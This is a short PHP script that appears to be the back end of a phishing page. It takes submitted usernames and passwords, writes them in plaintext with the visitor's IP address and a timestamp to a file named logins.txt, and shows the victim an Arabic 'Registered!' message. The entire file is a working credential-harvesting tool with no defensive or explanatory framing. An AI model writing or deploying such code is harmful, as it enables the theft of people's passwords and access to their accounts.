<?php
$file = "logins.txt";
$user = $_POST['username'] ?? 'null';
$pass = $_POST['password'] ?? 'null';
$ip   = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");

$line = "[$time][$ip] USER=$user | PASS=$pass" . PHP_EOL;
file_put_contents($file, $line, FILE_APPEND);

echo "تم التسجيل!";
?>
